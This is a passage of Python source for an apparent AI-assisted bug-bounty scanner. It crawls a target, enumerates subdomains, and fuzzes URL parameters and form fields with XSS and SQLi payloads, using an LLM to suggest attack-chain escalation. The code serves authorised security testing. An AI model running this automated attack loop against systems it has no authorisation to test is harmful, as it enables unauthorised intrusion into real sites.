            target_url = urlunparse(parsed._replace(query=new_query))

        resp = self._http.request(
            "POST" if data else "GET",
            target_url,
            headers=context.headers,
            data=data if data else None,
        )
        if resp is None:
            return {}
        try:
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "body": resp.text[:2000],
            }
        except Exception:
            return {}

    def _learn(self, result: AttackResult) -> None:
        """Record successful/failed payloads for adaptive selection."""
        with self._lock:
            key = result.context.vuln_type
            payload = result.context.payload
            if result.success:
                if payload not in self._success_patterns[key]:
                    self._success_patterns[key].append(payload)
            else:
                if payload not in self._fail_patterns[key]:
                    self._fail_patterns[key].append(payload)

    def best_payloads(self, vuln_type: str) -> List[str]:
        """Return payloads ranked by past success."""
        with self._lock:
            successes = self._success_patterns.get(vuln_type, [])
            base = PAYLOADS.get(vuln_type, [])
            # Prioritise payloads that have worked before
            return successes + [p for p in base if p not in successes]

# ---------------------------------------------------------------------------
# Attack Chain Engine
# ---------------------------------------------------------------------------
class AttackChainEngine:
    """Tracks multi-stage attack chains across different vulnerability types."""

    def __init__(self) -> None:
        self._chains: Dict[str, Dict] = {}
        self._url_to_chain: Dict[str, str] = {}
        self._lock = threading.Lock()

    def start_chain(self, result: AttackResult) -> str:
        chain_id = uuid.uuid4().hex[:8]
        with self._lock:
            self._chains[chain_id] = {
                "id": chain_id,
                "target_url": result.context.url,
                "started_at": datetime.utcnow().isoformat(),
                "stages": [self._stage_from_result(result)],
                "status": "active",
            }
            self._url_to_chain[result.context.url] = chain_id
        return chain_id

    def add_stage(self, chain_id: str, result: AttackResult) -> bool:
        with self._lock:
            chain = self._chains.get(chain_id)
            if chain is None or chain["status"] != "active":
                return False
            chain["stages"].append(self._stage_from_result(result))
        return True

    def suggest_next(self, chain_id: str) -> List[AttackContext]:
        with self._lock:
            chain = self._chains.get(chain_id, {})
        if not chain:
            return []
        llm = LLMReasoningEngine()
        return llm.suggest_chain_escalation(chain, {})

    def finalize_chain(self, chain_id: str) -> Dict:
        with self._lock:
            chain = self._chains.get(chain_id, {})
            if chain:
                chain["status"] = "finalized"
                chain["finalized_at"] = datetime.utcnow().isoformat()
            return dict(chain)

    def get_active_for_url(self, url: str) -> Optional[str]:
        with self._lock:
            cid = self._url_to_chain.get(url)
            if cid and self._chains.get(cid, {}).get("status") == "active":
                return cid
        return None

    def all_chains(self) -> List[Dict]:
        with self._lock:
            return [dict(c) for c in self._chains.values()]

    @staticmethod
    def _stage_from_result(result: AttackResult) -> Dict:
        return {
            "vuln_type": result.context.vuln_type,
            "url": result.context.url,
            "param": result.context.param,
            "payload": result.context.payload,
            "success": result.success,
            "confidence": result.confidence,
            "evidence": result.evidence,
            "timestamp": datetime.utcnow().isoformat(),
        }

# ---------------------------------------------------------------------------
# Prioritization engine
# ---------------------------------------------------------------------------
@dataclass
class Score:
    total: float
    priority: str


class PrioritizationEngine:
    """Scores and prioritises endpoints for testing."""

    _PRIORITY_KEYWORDS = {
        "admin": 3, "login": 3, "upload": 3, "file": 2, "exec": 3,
        "cmd": 3, "redirect": 2, "oauth": 2, "token": 2, "reset": 2,
        "password": 3, "api": 2, "graphql": 3, "webhook": 2,
    }

    def score(self, url: str, tech_stack: Optional[Dict] = None) -> Score:
        score = 0.0
        path = urlparse(url).path.lower()
        params = extract_params(url)

        # Path keywords
        for kw, weight in self._PRIORITY_KEYWORDS.items():
            if kw in path:
                score += weight

        # Parameters → more params == more attack surface
        score += len(params) * 0.5

        # Query string presence
        if "?" in url:
            score += 1.0

        # Tech stack bonuses
        if tech_stack:
            for tech in ("wordpress", "drupal", "joomla", "php", "laravel"):
                if tech in str(tech_stack).lower():
                    score += 1.5
                    break

        priority = (
            "CRITICAL" if score >= 8 else
            "HIGH" if score >= 5 else
            "MEDIUM" if score >= 3 else
            "LOW"
        )
        return Score(total=score, priority=priority)

    def prioritize(
        self, endpoints: List[str], tech_stack: Optional[Dict] = None
    ) -> List[Tuple[str, float, str]]:
        """FIX #9 – call self.score() exactly once per URL."""
        scored: List[Tuple[str, float, str]] = []
        for url in endpoints:
            s = self.score(url, tech_stack)
            scored.append((url, s.total, s.priority))
        scored.sort(key=lambda x: x[1], reverse=True)
        return scored

# ---------------------------------------------------------------------------
# Tech detection
# ---------------------------------------------------------------------------
def detect_tech(url: str, http_client: StreamingHTTPClient) -> Dict:
    """
    Perform lightweight technology fingerprinting on a URL.
    Returns a dict with keys: server, framework, cms, language, headers.
    """
    result: Dict[str, Any] = {
        "server": None,
        "framework": None,
        "cms": None,
        "language": None,
        "headers": {},
    }
    resp = http_client.get(url)
    if resp is None:
        return result

    # Capture interesting response headers
    for hdr in ("server", "x-powered-by", "x-generator", "x-aspnet-version", "x-runtime"):
        val = resp.headers.get(hdr) or resp.headers.get(hdr.title())
        if val:
            result["headers"][hdr] = val

    server_hdr = result["headers"].get("server", "").lower()
    powered_hdr = result["headers"].get("x-powered-by", "").lower()
    body = ""
    try:
        body = resp.text.lower()[:4000]
    except Exception:
        pass

    # Server
    for srv in ("nginx", "apache", "iis", "litespeed", "caddy"):
        if srv in server_hdr:
            result["server"] = srv
            break

    # Language / framework
    for lang_kw, lang in (
        ("php", "php"), ("asp.net", "asp.net"), ("ruby", "ruby"),
        ("django", "django"), ("laravel", "laravel"), ("flask", "flask"),
        ("express", "node.js"), ("node", "node.js"),
    ):
        if lang_kw in powered_hdr or lang_kw in body:
            result["language"] = lang
            break

    # CMS
    for cms in ("wordpress", "drupal", "joomla", "shopify", "magento", "ghost"):
        if cms in body:
            result["cms"] = cms
            break

    # WordPress specific
    if "wp-content" in body:
        result["cms"] = "wordpress"

    return result

# ---------------------------------------------------------------------------
# Crawler
# ---------------------------------------------------------------------------
def crawl(
    start_url: str,
    base_domain: str,
    http_client: StreamingHTTPClient,
    depth: int = 3,
    folder: str = ".",
) -> int:
    """
    BFS crawler that records unique in-scope URLs into state.endpoints.
    Returns the number of new URLs discovered.
    """
    visited: Set[str] = set()
    q: deque = deque([(start_url, 0)])
    discovered = 0
    max_pages = cfg.MAX_PAGES

    while q and len(visited) < max_pages:
        url, current_depth = q.popleft()
        if url in visited or current_depth > depth:
            continue
        visited.add(url)

        resp = http_client.get(url)
        if resp is None:
            continue

        if url not in state.endpoints:
            state.endpoints.add(url)
            discovered += 1

        if current_depth >= depth:
            continue

        try:
            content_type = resp.headers.get("content-type", "")
            if "html" not in content_type:
                continue
            if _BS4_AVAILABLE and BeautifulSoup is not None:
                soup = BeautifulSoup(resp.text, "html.parser")
                for tag in soup.find_all(["a", "form", "script", "link"]):
                    href = tag.get("href") or tag.get("src") or tag.get("action")
                    if not href:
                        continue
                    abs_url = urljoin(url, href)
                    abs_url = abs_url.split("#")[0].split("?")[0]
                    if in_scope(abs_url, base_domain) and abs_url not in visited:
                        q.append((abs_url, current_depth + 1))
        except Exception:
            pass

    return discovered

# ---------------------------------------------------------------------------
# Deep recon
# ---------------------------------------------------------------------------
def deep_recon(norm: str, folder: str) -> Set[str]:
    """
    Run subdomain enumeration tools (amass / subfinder) and return the set of
    in-scope subdomains.

    FIX #11 – handle subdomains that are already full URLs.
    """
    subs: Set[str] = set()
    parsed = urlparse(norm)
    base_domain = parsed.netloc
    base = f"{parsed.scheme}://{base_domain}"

    for tool, args in [
        ("subfinder", ["-d", base_domain, "-silent"]),
        ("amass", ["enum", "-passive", "-d", base_domain]),
    ]:
        path = shutil.which(tool)  # type: ignore[name-defined]
        if path is None:
            continue
        rc, out, _err = run_tool_streaming([path] + args, timeout=60)
        if rc != 0:
            continue
        for line in out.splitlines():
            sub = line.strip()
            if not sub:
                continue
            # FIX #11 – build a proper URL for scope checking
            if sub.startswith(("http://", "https://")):
                check_url = sub
                clean_sub = urlparse(sub).netloc
            else:
                check_url = f"https://{sub}"
                clean_sub = sub
            if in_scope(check_url, base):
                subs.add(clean_sub)

    return subs

# ---------------------------------------------------------------------------
# Form tester
# ---------------------------------------------------------------------------
def test_forms(http_client: StreamingHTTPClient, folder: str) -> List[Dict]:
    """
    Iterate over all crawled endpoints, extract HTML forms, and fuzz each field
    with XSS and SQLi payloads.
    """
    findings: List[Dict] = []
    loop = AdaptiveExploitLoop(http_client)

    urls_to_test: List[str] = []
    # Pull up to 20 URLs from state
    for url in list(state.endpoints._data.keys())[:20]:
        urls_to_test.append(url)

    for url in urls_to_test:
        resp = http_client.get(url)
        if resp is None:
            continue
        if not _BS4_AVAILABLE or BeautifulSoup is None:
            continue
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
        except Exception:
            continue

        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = (form.get("method", "get") or "get").upper()
            action_url = urljoin(url, action) if action else url

            if not in_scope(action_url, url):
                continue

            inputs = form.find_all(["input", "textarea", "select"])
            for inp in inputs:
                inp_name = inp.get("name") or inp.get("id")
                if not inp_name:
                    continue
                for vuln_type in ("xss", "sqli"):
                    payloads = loop.best_payloads(vuln_type)[:3]
                    for payload in payloads:
                        ctx = AttackContext(
                            url=action_url,
                            param=inp_name,
                            vuln_type=vuln_type,
                            payload=payload,
                            data={inp_name: payload},
                        )
                        result = loop.execute(ctx)
                        if result.success:
                            findings.append(Finding(
                                vuln_type=vuln_type,
                                severity=VULN_SEVERITIES.get(vuln_type, "MEDIUM"),
                                url=action_url,
                                param=inp_name,
                                payload=payload,
                                evidence=result.evidence,
                                confidence=result.confidence,
                            ).to_dict())
    return findings

# ---------------------------------------------------------------------------
# OODA worker  (FIX #2)
# ---------------------------------------------------------------------------
def ooda_worker(
    work_queue: queue.Queue,
    findings: List[Dict],
    base_domain: str,
    folder: str,
    http_client: StreamingHTTPClient,
    chain_engine: AttackChainEngine,
    prioritizer: PrioritizationEngine,
    tech_stack: Dict,
) -> None:
    """
    FIX #2 – initialise result *before* the while-loop so it is always
    bound even if the inner try-block never assigns it.
    """
    reasoner = LLMReasoningEngine()
    loop = AdaptiveExploitLoop(http_client)
    findings_lock = threading.Lock()

    # FIX #2 – default result so the name is always bound
    result = AttackResult(
        context=AttackContext(url="", param="", vuln_type="xss")
    )

    while True:
        try:
            item = work_queue.get(timeout=2)
        except queue.Empty:
            break

        url, score, priority = item
        canonical = {
            "url": url,
            "param_names": extract_params(url),
        }

        for param in canonical["param_names"][:3] or [""]:
            for vuln_type in list(PAYLOADS.keys()):
                payloads = loop.best_payloads(vuln_type)[:5]
                for payload in payloads:
                    try:
                        ctx = AttackContext(
                            url=url,
                            param=param,
                            vuln_type=vuln_type,
                            payload=payload,
                        )
                        result = loop.execute(ctx)
                        if result.success:
                            finding = Finding(
                                vuln_type=vuln_type,
                                severity=VULN_SEVERITIES.get(vuln_type, "MEDIUM"),
                                url=url,
                                param=param,
                                payload=payload,
                                evidence=result.evidence,
                                confidence=result.confidence,
                            )
                            with findings_lock:
                                findings.append(finding.to_dict())

                            # Chain escalation
                            existing_chain = chain_engine.get_active_for_url(url)
                            if existing_chain:
                                chain_engine.add_stage(existing_chain, result)
                            elif result.confidence >= 0.6:
                                cid = chain_engine.start_chain(result)
                                analysis = reasoner.analyze_response(result)
                                if analysis.get("chain_opportunity"):
                                    suggestions = chain_engine.suggest_next(cid)
                                    for sug in suggestions[:2]:
                                        work_queue.put((sug.url, 10.0, "CRITICAL"))

                    except Exception as exc:
                        logger.debug("ooda_worker error: %s", exc)

        work_queue.task_done()

# ---------------------------------------------------------------------------
# Report generator
# ---------------------------------------------------------------------------
def generate_report(
    findings: List[Dict],
    folder: str,
    target: str,
    chain_engine: AttackChainEngine,
    tech_stack: Dict,
    mcp_client: Optional[Any] = None,
) -> str:
    """
    Generate an HTML report and a findings.json file.
    Returns the path to the HTML report.
    """
    report_dir = Path(folder)
    report_dir.mkdir(parents=True, exist_ok=True)

    # Severity counts
    counts: Dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev = f.get("severity", "INFO").upper()
        counts[sev] = counts.get(sev, 0) + 1

    # Risk score (0-100)
    risk_score = min(
        100,
        counts["CRITICAL"] * 25
        + counts["HIGH"] * 10
        + counts["MEDIUM"] * 5
        + counts["LOW"] * 1,
    )

    # ── findings.json ──────────────────────────────────────────────────────
    json_path = report_dir / "findings.json"
    try:
        with open(json_path, "w", encoding="utf-8") as fh:
            json.dump(
                {
                    "target": target,
                    "generated_at": datetime.utcnow().isoformat() + "Z",
                    "risk_score": risk_score,
                    "counts": counts,
                    "findings": findings,
                    "chains": chain_engine.all_chains(),
                    "tech_stack": tech_stack,
                },
                fh,
                indent=2,
            )
    except Exception as exc:
        logger.warning("Could not write findings.json: %s", exc)

    # ── HTML report ────────────────────────────────────────────────────────
    def _sev_color(sev: str) -> str:
        return {
            "CRITICAL": "#b91c1c",
            "HIGH": "#ea580c",
            "MEDIUM": "#d97706",
            "LOW": "#16a34a",
            "INFO": "#2563eb",
        }.get(sev.upper(), "#6b7280")

    vuln_cards_html = ""
    for idx, f in enumerate(findings, 1):
        sev = f.get("severity", "INFO").upper()
        color = _sev_color(sev)
        evidence_items = "".join(
            f"<li>{html.escape(str(ev))}</li>"
            for ev in f.get("evidence", [])
        )
        vuln_cards_html += f"""
        <div class="card" style="border-left:4px solid {color};margin:12px 0;padding:12px;background:#1e1e2e;border-radius:6px;">
          <h3 style="color:{color};margin:0 0 8px 0;">#{idx} {html.escape(f.get('vuln_type','?').upper())} <span style="font-size:.75em;background:{color};color:#fff;padding:2px 8px;border-radius:9999px;">{sev}</span></h3>
          <table style="width:100%;font-size:.85em;border-collapse:collapse;">
            <tr><td style="color:#9ca3af;width:110px;">URL</td><td style="word-break:break-all;">{html.escape(str(f.get('url','')))}</td></tr>
            <tr><td style="color:#9ca3af;">Parameter</td><td>{html.escape(str(f.get('param','')))}</td></tr>
            <tr><td style="color:#9ca3af;">Payload</td><td><code style="background:#111827;padding:2px 6px;border-radius:4px;">{html.escape(str(f.get('payload','')))}</code></td></tr>
            <tr><td style="color:#9ca3af;">Confidence</td><td>{f.get('confidence',0):.0%}</td></tr>
          </table>
          <details style="margin-top:8px;"><summary style="color:#9ca3af;cursor:pointer;">Evidence ({len(f.get('evidence',[]))})</summary>
            <ul style="margin-top:4px;padding-left:20px;color:#d1d5db;">{evidence_items}</ul>
          </details>
        </div>"""

    chains_html = ""
    for chain in chain_engine.all_chains():
        stages = chain.get("stages", [])
        stage_items = "".join(
            f"<li><strong>{html.escape(s.get('vuln_type','?'))}</strong> @ {html.escape(str(s.get('url','')))}"
            f" — {html.escape(s.get('timestamp','')[:19])}</li>"
            for s in stages
        )
        chains_html += f"""
        <div style="background:#1e1e2e;border-radius:6px;padding:12px;margin:10px 0;">
          <strong style="color:#a78bfa;">Chain {html.escape(chain.get('id','?'))}</strong>
          <ul style="margin-top:6px;padding-left:20px;color:#d1d5db;">{stage_items}</ul>
        </div>"""

    tech_rows = ""
    for k, v in (tech_stack or {}).items():
        if v:
            tech_rows += f"<tr><td style='color:#9ca3af;'>{html.escape(k.title())}</td><td>{html.escape(str(v))}</td></tr>"

    html_report = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>HexStrike Report &#8211; {html.escape(target)}</title>
<style>
  *{{box-sizing:border-box;}}
  body{{margin:0;background:#0f0f1a;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;}}
  .wrap{{max-width:1100px;margin:0 auto;padding:24px;}}
  h1{{color:#a78bfa;}}h2{{color:#60a5fa;border-bottom:1px solid #334155;padding-bottom:6px;}}
  code{{font-family:'Courier New',monospace;}}
  .badge{{display:inline-block;padding:4px 12px;border-radius:9999px;font-size:.8em;font-weight:600;}}
  table{{width:100%;border-collapse:collapse;}}td{{padding:4px 8px;}}
  .risk-bar-wrap{{background:#334155;border-radius:9999px;height:20px;width:100%;}}
  .risk-bar{{height:20px;border-radius:9999px;background:linear-gradient(90deg,#16a34a,#d97706,#b91c1c);transition:width .5s;}}
</style>
</head>
<body>
<div class="wrap">
  <h1>🛡 HexStrike AI &#8212; Security Report</h1>
  <p style="color:#9ca3af;">Target: <strong style="color:#e2e8f0;">{html.escape(target)}</strong> &nbsp;|&nbsp; Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</p>

  <h2>Executive Summary</h2>
  <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px;">
    <div style="background:#7f1d1d;padding:12px 24px;border-radius:8px;text-align:center;"><div style="font-size:2em;font-weight:700;">{counts['CRITICAL']}</div><div style="font-size:.8em;color:#fca5a5;">CRITICAL</div></div>
    <div style="background:#7c2d12;padding:12px 24px;border-radius:8px;text-align:center;"><div style="font-size:2em;font-weight:700;">{counts['HIGH']}</div><div style="font-size:.8em;color:#fdba74;">HIGH</div></div>
    <div style="background:#78350f;padding:12px 24px;border-radius:8px;text-align:center;"><div style="font-size:2em;font-weight:700;">{counts['MEDIUM']}</div><div style="font-size:.8em;color:#fde68a;">MEDIUM</div></div>
    <div style="background:#14532d;padding:12px 24px;border-radius:8px;text-align:center;"><div style="font-size:2em;font-weight:700;">{counts['LOW']}</div><div style="font-size:.8em;color:#86efac;">LOW</div></div>
  </div>
  <p>Risk score: <strong>{risk_score}/100</strong></p>
  <div class="risk-bar-wrap"><div class="risk-bar" style="width:{risk_score}%;"></div></div>

  <h2 style="margin-top:32px;">Technology Stack</h2>
  <table>{tech_rows or '<tr><td style="color:#9ca3af;">No technology data available.</td></tr>'}</table>

  <h2 style="margin-top:32px;">Vulnerabilities ({len(findings)})</h2>
  {vuln_cards_html or '<p style="color:#9ca3af;">No vulnerabilities found.</p>'}

  <h2 style="margin-top:32px;">Attack Chains ({len(chain_engine.all_chains())})</h2>
  {chains_html or '<p style="color:#9ca3af;">No attack chains recorded.</p>'}
</div>
</body>
</html>"""

    html_path = report_dir / "report.html"
    try:
        with open(html_path, "w", encoding="utf-8") as fh:
            fh.write(html_report)
    except Exception as exc:
        logger.warning("Could not write report.html: %s", exc)

    return str(html_path)

# ---------------------------------------------------------------------------
# Main scan pipeline
# ---------------------------------------------------------------------------
def run_scan(target: str) -> Tuple[List[Dict], "AttackChainEngine", Dict]:
    """
    FIX #4 – return (findings, chain_engine, tech_stack) as a 3-tuple.
    FIX #5 – create HTTP_SEM here, after cfg.WORKERS has been set by main().
    """
    global HTTP_SEM
    # FIX #5 – semaphore sized to current cfg.WORKERS (not a stale module-level default)
    HTTP_SEM = threading.Semaphore(cfg.WORKERS * 2)

    norm = normalize_url(target)
    folder = os.path.join(cfg.OUTPUT_DIR, urlparse(norm).netloc.replace(":", "_"))
    Path(folder).mkdir(parents=True, exist_ok=True)

    console.print(f"[bold cyan][🔍] Starting scan: {norm}[/bold cyan]")

    http_client = StreamingHTTPClient()
    chain_engine = AttackChainEngine()
    prioritizer = PrioritizationEngine()

    # ── 1. Tech detection ─────────────────────────────────────────────────
    console.print("[cyan]  [→] Detecting technologies…[/cyan]")
    tech_stack = detect_tech(norm, http_client)
    console.print(f"     CMS={tech_stack.get('cms')} Lang={tech_stack.get('language')} Server={tech_stack.get('server')}")

    # ── 2. Deep recon ─────────────────────────────────────────────────────
    console.print("[cyan]  [→] Running subdomain recon…[/cyan]")
    subs = deep_recon(norm, folder)
    console.print(f"     Found {len(subs)} subdomain(s)")

    # ── 3. Crawl ──────────────────────────────────────────────────────────
    console.print(f"[cyan]  [→] Crawling (depth={cfg.CRAWL_DEPTH})…[/cyan]")
    discovered = crawl(norm, norm, http_client, depth=cfg.CRAWL_DEPTH, folder=folder)
    for sub in list(subs)[:5]:
        crawl(f"https://{sub}", norm, http_client, depth=1, folder=folder)
    console.print(f"     Discovered {discovered} URL(s)")

    # ── 4. Prioritize ─────────────────────────────────────────────────────
    all_endpoints = list(state.endpoints._data.keys())
    scored = prioritizer.prioritize(all_endpoints, tech_stack)
    console.print(f"     Prioritized {len(scored)} endpoint(s)")

    # ── 5. OODA workers ───────────────────────────────────────────────────
    console.print(f"[cyan]  [→] Launching {cfg.WORKERS} OODA worker(s)…[/cyan]")
    findings: List[Dict] = []
    work_queue: queue.Queue = queue.Queue()
    for item in scored:
        work_queue.put(item)

    threads = []
    for _ in range(cfg.WORKERS):
        t = threading.Thread(
            target=ooda_worker,
            args=(work_queue, findings, norm, folder, http_client, chain_engine, prioritizer, tech_stack),
            daemon=True,
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=300)

    # ── 6. Form testing ───────────────────────────────────────────────────
    console.print("[cyan]  [→] Testing forms…[/cyan]")
    form_findings = test_forms(http_client, folder)
    findings.extend(form_findings)

    console.print(
        f"[bold green][✔] Scan complete. {len(findings)} finding(s).[/bold green]"
    )
    # FIX #4 – return all three items so main() can pass them to generate_report
    return findings, chain_engine, tech_stack

# ---------------------------------------------------------------------------
# Signal handlers
# ---------------------------------------------------------------------------
def _handle_sigint(signum: int, frame: Any) -> None:
    console.print("\n[yellow][!] Interrupted – cleaning up…[/yellow]")
    state.cleanup_pids()
    sys.exit(130)


def _handle_sigterm(signum: int, frame: Any) -> None:
    state.cleanup_pids()
    sys.exit(0)


signal.signal(signal.SIGINT, _handle_sigint)
signal.signal(signal.SIGTERM, _handle_sigterm)

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    global EXTRA_HEADERS

    parser = argparse.ArgumentParser(
        description=f"HexStrike AI Bug Bounty Engine v{__version__}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://www.probiller.com \\
      --bug-bounty-header "godizgood" \\
      --extra-header "X-Custom: value" \\
      --rate-limit 7 \\
      --user-agent "Mozilla/5.0 (compatible; BugBountyBot/1.0)"
""",
    )

    # Core arguments
    parser.add_argument("target", help="Target URL or domain")
    parser.add_argument("--workers", type=int, default=4, help="Parallel worker threads (default: 4)")
    parser.add_argument("--proxy", type=str, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--deepinfra-key", type=str, help="DeepInfra API key")
    parser.add_argument("--oob-server", type=str, help="Out-of-band callback server hostname")
    parser.add_argument("--output-dir", type=str, default="results", help="Output directory (default: results)")
    parser.add_argument("--no-rag", action="store_true", help="Disable RAG memory")
    parser.add_argument("--gpu", action="store_true", help="Use GPU for embeddings")
    parser.add_argument("--crawl-depth", type=int, default=3, help="Crawler depth (default: 3)")
    parser.add_argument("--max-pages", type=int, default=40, help="Max pages to crawl (default: 40)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds (default: 10)")

    # NEW CLI arguments
    parser.add_argument(
        "--bug-bounty-header",
        type=str,
        metavar="VALUE",
        help="Value for X-Bug-Bounty header (e.g. 'godizgood')",
    )
    parser.add_argument(
        "--extra-header",
        action="append",
        dest="extra_headers",
        metavar="Name: Value",
        help="Extra header injected into every request (repeatable)",
    )
    parser.add_argument(
        "--rate-limit",
        type=float,
        default=7.0,
        metavar="N",
        help="Max HTTP requests per second (default: 7.0)",
    )
    parser.add_argument(
        "--user-agent",
        type=str,
        metavar="STRING",
        help="Fixed User-Agent string (overrides rotating default)",
    )

    args = parser.parse_args()

    # ── Apply config overrides ─────────────────────────────────────────────
    cfg.WORKERS = args.workers
    cfg.PROXY = args.proxy
    cfg.DEEPINFRA_KEY = args.deepinfra_key
    cfg.OOB_SERVER = args.oob_server
    cfg.OUTPUT_DIR = args.output_dir
    cfg.USE_RAG = not args.no_rag
    cfg.USE_GPU = args.gpu
    cfg.CRAWL_DEPTH = args.crawl_depth
    cfg.MAX_PAGES = args.max_pages
    cfg.TIMEOUT = args.timeout
    cfg.RATE_LIMIT = args.rate_limit
    cfg.USER_AGENT = args.user_agent

    # ── Populate EXTRA_HEADERS global ─────────────────────────────────────
    EXTRA_HEADERS = {}
    if args.bug_bounty_header:
        EXTRA_HEADERS["X-Bug-Bounty"] = args.bug_bounty_header
    if args.extra_headers:
        for raw_hdr in args.extra_headers:
            if ":" in raw_hdr:
                name, _, value = raw_hdr.partition(":")
                EXTRA_HEADERS[name.strip()] = value.strip()
            else:
                logger.warning("Ignoring malformed --extra-header %r (no colon)", raw_hdr)

    # ── MCP client (optional) ─────────────────────────────────────────────
    mcp: Optional[Any] = None
    try:
        # Only import if the companion module is present
        from hexstrike_mcp import HexStrikeClient  # type: ignore
        mcp = HexStrikeClient("http://127.0.0.1:8888")
    except Exception:
        pass

    # ── Banner ─────────────────────────────────────────────────────────────
    console.print(
        Panel(
            f"[bold magenta]HexStrike AI Bug Bounty Engine v{__version__}[/bold magenta]\n"
            f"Target : [cyan]{args.target}[/cyan]\n"
            f"Workers: [yellow]{cfg.WORKERS}[/yellow]  "
            f"Rate: [yellow]{cfg.RATE_LIMIT} req/s[/yellow]  "
            f"Depth: [yellow]{cfg.CRAWL_DEPTH}[/yellow]",
            title="[bold red]🔥 HexStrike[/bold red]",
        )
        if _RICH_AVAILABLE
        else f"HexStrike v{__version__} | Target: {args.target}"
    )

    if EXTRA_HEADERS:
        console.print(f"[cyan]  Extra headers: {EXTRA_HEADERS}[/cyan]")

    # ── FIX #4: unpack 3-tuple from run_scan ──────────────────────────────
    findings, chain_engine, tech_stack = run_scan(args.target)

    folder = os.path.join(cfg.OUTPUT_DIR, urlparse(normalize_url(args.target)).netloc.replace(":", "_"))

    report_path = generate_report(
        findings=findings,
        folder=folder,
        target=args.target,
        chain_engine=chain_engine,
        tech_stack=tech_stack,
        mcp_client=mcp,
    )

    console.print(
        f"[bold green][✔] Report written → {report_path}[/bold green]"
    )
    console.print(
        f"[bold green][✔] Findings JSON → {os.path.join(folder, 'findings.json')}[/bold green]"
    )

    sev_total = sum(1 for f in findings if f.get("severity") in ("CRITICAL", "HIGH"))
    sys.exit(1 if sev_total > 0 else 0)


if __name__ == "__main__":
    main()
